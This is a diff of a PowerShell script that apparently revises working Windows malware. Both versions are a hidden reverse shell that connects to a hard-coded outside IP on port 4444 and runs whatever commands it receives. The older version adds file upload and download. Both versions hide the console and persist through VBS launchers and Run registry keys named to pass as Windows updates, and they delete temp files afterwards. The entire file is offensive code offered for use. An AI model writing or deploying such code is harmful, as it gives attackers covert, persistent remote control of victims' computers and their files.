@@ -1,140 +1,38 @@
-# Hide PowerShell window immediately
+# Completely hidden reverse shell with proper startup hiding
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
+[Console.Window]::Hide()
 
-# Paths for persistence
-$programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
-$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$persistentPath = "C:\ProgramData\SystemShell.ps1"
-$vbsPath = Join-Path $startupPath "SystemRun.vbs"
-$wshPath = Join-Path $env:TEMP "HiddenRunner.vbs"
+# Persistence paths
+$psPath = "C:\ProgramData\System.ps1"
+$vbsPath = "C:\ProgramData\Sys.vbs"
 
-# Save current script to ProgramData for persistence
-$currentScriptContent = @'
-# Completely hidden PowerShell reverse shell
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
-
-# TCP Connection parameters
-$ip = "143.110.191.171"
-$port = 4444
-
-function Start-ReverseShell {
-    while($true) {
-        try {
-            $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-            $stream = $client.GetStream()
-            $reader = New-Object System.IO.StreamReader($stream)
-            $writer = New-Object System.IO.StreamWriter($stream)
-            $writer.AutoFlush = $true
-
-            while($client.Connected) {
-                $writer.Write("PS " + (Get-Location).Path + "> ")
-                $command = $reader.ReadLine()
-                
-                if($command -eq "exit") { break }
-                if($command -eq "quit") { return }
-                
-                # Handle special commands
-                if($command.StartsWith("download ")) {
-                    $file = $command.Substring(9)
-                    if(Test-Path $file) {
-                        try {
-                            $content = [System.IO.File]::ReadAllBytes($file)
-                            $writer.Write("[DOWNLOAD]:" + [Convert]::ToBase64String($content) + "`n")
-                        } catch {
-                            $writer.Write("Error downloading file: " + $_.Exception.Message + "`n")
-                        }
-                    } else {
-                        $writer.Write("File not found`n")
-                    }
-                    continue
-                }
-                
-                if($command.StartsWith("upload ")) {
-                    $parts = $command.Split(' ', 3)
-                    if($parts.Length -eq 3) {
-                        try {
-                            $filePath = $parts[1]
-                            $fileContent = [Convert]::FromBase64String($parts[2])
-                            [System.IO.File]::WriteAllBytes($filePath, $fileContent)
-                            $writer.Write("File uploaded successfully`n")
-                        } catch {
-                            $writer.Write("Error uploading file: " + $_.Exception.Message + "`n")
-                        }
-                    }
-                    continue
-                }
-                
-                # Execute regular command
-                try {
-                    $output = Invoke-Expression -Command $command 2>&1 | Out-String
-                    $writer.Write($output)
-                } catch {
-                    $writer.Write("Error: " + $_.Exception.Message + "`n")
-                }
-            }
-            
-            $reader.Close()
-            $writer.Close()
-            $stream.Close()
-            $client.Close()
-        } catch {
-            Start-Sleep -Seconds 10
-        }
-    }
-}
-
-Start-ReverseShell
+# Create the main reverse shell script
+$psContent = @'
+Add-Type -Name Window -Namespace Console -MemberDefinition ''[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'';[Console.Window]::Hide()
+while($true){try{$c=New-Object Net.Sockets.TCPClient("143.110.191.171",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=iex $d 2>&1;$p=$o|Out-String;$q=$p+"PS "+(pwd).Path+"> ";$w=[text.encoding]::ASCII.GetBytes($q);$s.Write($w,0,$w.Length);$s.Flush()};$c.Close()}catch{Start-Sleep -Seconds 10}}
 '@
+Set-Content $psPath $psContent
 
-# Write persistent script
-Set-Content -Path $persistentPath -Value $currentScriptContent -Force
-
-# Create improved VBS script for completely hidden execution
+# Create VBS script for completely hidden startup execution
 $vbsContent = @"
-Set objShell = CreateObject("WScript.Shell")
-' Run completely hidden without any window flash
-objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""if(1){Start-Process PowerShell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \""$persistentPath\""' -WindowStyle Hidden}""", 0, False
+Set ws = CreateObject("Wscript.Shell")
+ws.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$psPath""", 0, False
 "@
+Set-Content $vbsPath $vbsContent
 
-Set-Content -Path $vbsPath -Value $vbsContent -Force
+# Registry persistence using VBS (completely hidden)
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "wscript.exe `"$vbsPath`""
 
-# Create additional WSH script for extra hidden layer
-$wshContent = @"
-var shell = new ActiveXObject("WScript.Shell");
-shell.Run('powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process PowerShell.exe -ArgumentList ''-WindowStyle Hidden -ExecutionPolicy Bypass -File ""$persistentPath""'' -WindowStyle Hidden"', 0, false);
-"@
+# Start hidden immediately using VBS
+$tempVbs = Join-Path $env:TEMP "temp.vbs"
+Set-Content $tempVbs $vbsContent
+Start-Process wscript.exe -ArgumentList "`"$tempVbs`"" -WindowStyle Hidden
 
-Set-Content -Path $wshPath -Value $wshContent -Force
-
-# Registry persistence with hidden execution
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "WindowsSystem"
-$regValue = "wscript.exe //B `"$wshPath`""
-New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
-
-# Alternative registry entry using cmd hidden
-$regName2 = "MSUpdate"
-$regValue2 = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistentPath`""
-New-ItemProperty -Path $regPath -Name $regName2 -Value $regValue2 -PropertyType String -Force | Out-Null
-
-# Start completely hidden using multiple layers
-Start-Process -FilePath "wscript.exe" -ArgumentList "//B", "`"$wshPath`"" -WindowStyle Hidden
-
-# Remove temporary download file after delay
+# Cleanup temp files after 10 seconds
 Start-Sleep -Seconds 10
-Remove-Item -Path "$env:TEMP\persist.ps1" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "$env:TEMP\test.ps1" -Force -ErrorAction SilentlyContinue
+Remove-Item $tempVbs -Force -ErrorAction SilentlyContinue
